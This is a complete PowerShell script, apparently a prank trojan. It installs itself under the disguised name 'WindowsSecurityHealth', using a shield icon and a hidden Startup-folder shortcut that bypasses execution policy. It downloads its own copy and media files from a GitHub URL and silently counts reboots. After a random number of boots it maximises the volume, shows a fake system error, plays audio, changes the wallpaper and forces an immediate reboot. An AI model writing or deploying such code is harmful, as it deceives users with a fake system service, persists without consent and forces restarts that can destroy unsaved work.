# ============================================================
#  Run 1       -> download + register autostart + counter=1
#  Run 2..N    -> increment counter, exit quietly (NO OUTPUT)
#  Run >= limit-> TRIGGER + wait 3s + reboot
# ============================================================

# --- SETTINGS ---
$ScriptUrl    = "https://raw.githubusercontent.com/pililpililovich/bananos/main/okek.ps1"

$WallpaperUrl = "https://github.com/pililpililovich/bananos/raw/refs/heads/main/banan.png"
$AudioUrl     = "https://github.com/pililpililovich/bananos/raw/refs/heads/main/banan.mp3"

$CacheDir = Join-Path $env:LOCALAPPDATA "CustomDesktop"
if (-not (Test-Path $CacheDir)) {
    New-Item -ItemType Directory -Path $CacheDir -Force | Out-Null
}

$WallpaperPath = Join-Path $CacheDir "wallpaper.png"
$AudioPath     = Join-Path $CacheDir "sound.mp3"

# --- DISGUISE NAMES ---
$ShortcutName  = "WindowsSecurityHealth.lnk"
$SelfCopyName  = "WindowsSecurityHealth.ps1"
$SelfCopyPath  = Join-Path $CacheDir $SelfCopyName

$IconPath      = "$env:SystemRoot\System32\shell32.dll"
$IconIndex     = 47   # shield

# Capture script path at top level, BEFORE entering any function.
$ScriptSelfPath = $MyInvocation.MyCommand.Path
if (-not $ScriptSelfPath) { $ScriptSelfPath = $PSCommandPath }
if (-not $ScriptSelfPath) { $ScriptSelfPath = $MyInvocation.MyCommand.Definition }

# --- SILENT MODE FLAG ---
# Set to $true only on the very first run (when assets are missing).
# Everywhere else -> no output at all.
$Verbose = $false

# --- COUNTER FILES (in TEMP) ---
$CounterFile = Join-Path $env:TEMP "startupus.txt"
$LimitFile   = Join-Path $env:TEMP "startupus_limit.txt"

function Get-Counter {
    if (Test-Path $CounterFile) {
        try { return [int](Get-Content $CounterFile -Raw).Trim() } catch { return 0 }
    }
    return 0
}
function Set-Counter([int]$v) { Set-Content -Path $CounterFile -Value $v -Encoding ASCII }

# --- Threshold: generate once, random 6..15 ---
if (-not (Test-Path $LimitFile)) {
    $rnd = Get-Random -Minimum 6 -Maximum 16
    Set-Content -Path $LimitFile -Value $rnd -Encoding ASCII
}
$Limit = [int](Get-Content $LimitFile -Raw).Trim()

# --- DOWNLOAD HELPER ---
function Get-CachedFile {
    param([string]$Url, [string]$Path, [string]$Name)
    if (Test-Path $Path) {
        if ($Verbose) { Write-Host "$Name cached: $Path" -ForegroundColor Yellow }
        return $true
    }
    if ($Verbose) { Write-Host "Downloading $Name..." -ForegroundColor Cyan }
    try {
        Invoke-WebRequest -Uri $Url -OutFile $Path -UseBasicParsing -ErrorAction Stop
        if ($Verbose) { Write-Host "$Name downloaded." -ForegroundColor Green }
        return $true
    } catch {
        if ($Verbose) { Write-Error "Failed: $Name : $_" }
        return $false
    }
}

# --- AUTOSTART HELPERS ---
function Register-Autostart {
    param([string]$SelfPath)

    $startupDir = [Environment]::GetFolderPath('Startup')
    $lnkPath    = Join-Path $startupDir $ShortcutName

    if ($Verbose) {
        Write-Host "[autostart] Startup dir: $startupDir" -ForegroundColor DarkCyan
        Write-Host "[autostart] lnk path   : $lnkPath"     -ForegroundColor DarkCyan
        Write-Host "[autostart] SelfPath   : '$SelfPath'" -ForegroundColor DarkCyan
    }

    if (Test-Path $lnkPath) {
        if ($Verbose) { Write-Host "[autostart] already exists - skip" -ForegroundColor Yellow }
        return $true
    }

    if (-not (Test-Path $CacheDir)) {
        New-Item -ItemType Directory -Path $CacheDir -Force | Out-Null
    }

    $gotCopy = $false

    # 1) Copy the current file
    if ($SelfPath -and (Test-Path $SelfPath)) {
        try {
            Copy-Item -Path $SelfPath -Destination $SelfCopyPath -Force -ErrorAction Stop
            $gotCopy = $true
            if ($Verbose) { Write-Host "[autostart] self-copy OK -> $SelfCopyPath" -ForegroundColor Green }
        } catch {
            if ($Verbose) { Write-Warning "[autostart] self-copy failed: $_" }
        }
    } else {
        if ($Verbose) { Write-Host "[autostart] SelfPath is empty - will try URL" -ForegroundColor Yellow }
    }

    # 2) Download by URL
    if (-not $gotCopy) {
        if ([string]::IsNullOrWhiteSpace($ScriptUrl) -or $ScriptUrl -like "*USER/REPO*") {
            if ($Verbose) { Write-Warning "[autostart] ScriptUrl is not set - autostart impossible." }
            return $false
        }
        try {
            Invoke-WebRequest -Uri $ScriptUrl -OutFile $SelfCopyPath -UseBasicParsing -ErrorAction Stop
            $gotCopy = $true
            if ($Verbose) { Write-Host "[autostart] downloaded from URL -> $SelfCopyPath" -ForegroundColor Green }
        } catch {
            if ($Verbose) { Write-Warning "[autostart] download failed: $_" }
            return $false
        }
    }

    # 3) Shortcut with system-like name and shield icon
    try {
        $wsh = New-Object -ComObject WScript.Shell
        $lnk = $wsh.CreateShortcut($lnkPath)
        $lnk.TargetPath       = "powershell.exe"
        $lnk.Arguments        = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$SelfCopyPath`""
        $lnk.WorkingDirectory = $CacheDir
        $lnk.IconLocation     = "$IconPath,$IconIndex"
        $lnk.Description      = "Windows Security Health Service"
        $lnk.Save()
        if ($Verbose) { Write-Host "[autostart] shortcut created: $lnkPath" -ForegroundColor Green }
        return $true
    } catch {
        if ($Verbose) { Write-Warning "[autostart] shortcut creation failed: $_" }
        return $false
    }
}

# ============================================================
#  FIRST RUN DETECTION -> enable verbose only here
# ============================================================
$assetsMissing = (-not (Test-Path $WallpaperPath)) -or (-not (Test-Path $AudioPath))
if ($assetsMissing) {
    $Verbose = $true
    Write-Host "[main] ScriptSelfPath = '$ScriptSelfPath'" -ForegroundColor DarkCyan
}

# ============================================================
#  GUARANTEED AUTOSTART REGISTRATION
# ============================================================
$reg = Register-Autostart -SelfPath $ScriptSelfPath
if (-not $reg) {
    if ($Verbose) { Write-Warning "Autostart not registered - exiting." }
    exit 2
}

# ============================================================
#  DOWNLOAD (if files are not present yet)
# ============================================================
if ($assetsMissing) {
    Write-Host "First run - downloading only." -ForegroundColor Magenta
    $ok1 = Get-CachedFile -Url $WallpaperUrl -Path $WallpaperPath -Name "Wallpaper"
    $ok2 = Get-CachedFile -Url $AudioUrl     -Path $AudioPath     -Name "Audio"
    if (-not $ok1 -or -not $ok2) {
        Write-Warning "Download failed."
        exit 1
    }
    if (-not (Test-Path $CounterFile)) { Set-Counter 1 }
    Write-Host "Downloaded. Counter=$(Get-Counter) / Limit=$Limit" -ForegroundColor Magenta
    exit 0
}

# ============================================================
#  COUNTER (silent)
# ============================================================
$counter = Get-Counter
$counter++
Set-Counter $counter

if ($counter -lt $Limit) {
    exit 0
}

# ============================================================
#  TRIGGER (silent, then reboot)
# ============================================================

# --- PREP: WinAPI helper ---
$suffix = [Guid]::NewGuid().ToString("N").Substring(0,8)
$className = "WinApi_$suffix"

$apiCode = @"
using System;
using System.Runtime.InteropServices;
public class $className {
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@
Add-Type -TypeDefinition $apiCode -ErrorAction Stop
$WinApi = [type]$className

# --- STEP 1: MAX VOLUME 100% + UNMUTE ---
$volSuffix = [Guid]::NewGuid().ToString("N").Substring(0,8)
$volClass  = "AudioCtl_$volSuffix"

$volCode = @"
using System;
using System.Runtime.InteropServices;

[Guid("5CDF2C82-841E-4546-9722-0CF74078229A"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IAudioEndpointVolume {
    int f(); int g(); int h(); int i();
    int SetMasterVolumeLevelScalar(float fLevel, Guid pguidEventContext);
    int j();
    int GetMasterVolumeLevelScalar(out float pfLevel);
    int k(); int l(); int m(); int n();
    int SetMute(bool bMute, Guid pguidEventContext);
    int GetMute(out bool pbMute);
}
[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDevice {
    int Activate(ref Guid id, int clsCtx, IntPtr activationParams, out IAudioEndpointVolume aev);
}
[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDeviceEnumerator {
    int f();
    int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);
}
[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")]
class MMDeviceEnumeratorComObject { }

public class $volClass {
    static IAudioEndpointVolume Vol() {
        var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;
        IMMDevice dev = null;
        Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(0, 1, out dev));
        IAudioEndpointVolume epv = null;
        var epvid = typeof(IAudioEndpointVolume).GUID;
        Marshal.ThrowExceptionForHR(dev.Activate(ref epvid, 23, IntPtr.Zero, out epv));
        return epv;
    }
    public static void SetVolume(float level) {
        Marshal.ThrowExceptionForHR(Vol().SetMasterVolumeLevelScalar(level, Guid.Empty));
    }
    public static void Unmute() {
        Marshal.ThrowExceptionForHR(Vol().SetMute(false, Guid.Empty));
    }
}
"@
Add-Type -TypeDefinition $volCode -ErrorAction Stop
$AudioCtl = [type]$volClass

try {
    $AudioCtl::Unmute()
    $AudioCtl::SetVolume(1.0)
    Start-Sleep -Milliseconds 200
} catch {
    try {
        $wsh = New-Object -ComObject WScript.Shell
        for ($i = 0; $i -lt 60; $i++) { $wsh.SendKeys([char]175) }
    } catch {}
}

# --- STEP 2: NON-BLOCKING ERROR DIALOG ---
$dialogScript = {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    [System.Windows.Forms.MessageBox]::Show(
        "ADIN BANAN BIL OBNARYZEN V VASHEM PC!",
        "System Error",
        [System.Windows.Forms.MessageBoxButtons]::OK,
        [System.Windows.Forms.MessageBoxIcon]::Error
    ) | Out-Null
}
Start-Job -ScriptBlock $dialogScript | Out-Null
Start-Sleep -Milliseconds 300

# --- STEP 3: PLAY AUDIO VIA WMP ---
$wmp64 = Join-Path $env:ProgramFiles "Windows Media Player\wmplayer.exe"
$wmp32 = Join-Path ${env:ProgramFiles(x86)} "Windows Media Player\wmplayer.exe"

$wmp = $null
if (Test-Path $wmp64) { $wmp = $wmp64 }
elseif (Test-Path $wmp32) { $wmp = $wmp32 }

if ($wmp) {
    $proc = Start-Process -FilePath $wmp -ArgumentList "`"$AudioPath`"" -PassThru
} else {
    $proc = Start-Process -FilePath $AudioPath -PassThru
}

# --- STEP 4: MINIMIZE WMP ---
Start-Sleep -Milliseconds 600
if ($proc -and -not $proc.HasExited) {
    $proc.Refresh()
    $hwnd = $proc.MainWindowHandle
    if ($hwnd -eq [IntPtr]::Zero) { $hwnd = $WinApi::GetForegroundWindow() }
    if ($hwnd -ne [IntPtr]::Zero) {
        $WinApi::ShowWindow($hwnd, 6) | Out-Null
    }
}

# --- STEP 5: MINIMIZE ALL ---
try {
    $shell = New-Object -ComObject Shell.Application
    $shell.MinimizeAll()
} catch {}
Start-Sleep -Milliseconds 500

# --- STEP 6: WALLPAPER ---
$WinApi::SystemParametersInfo(0x0014, 0, $WallpaperPath, 0x01 -bor 0x02) | Out-Null

# --- STEP 7: make it permanent ---
Set-Counter $Limit

# --- STEP 8: wait 3 seconds and reboot ---
Start-Sleep -Seconds 3
shutdown.exe /r /t 0 /f

Get-Job | Remove-Job -Force -ErrorAction SilentlyContinue
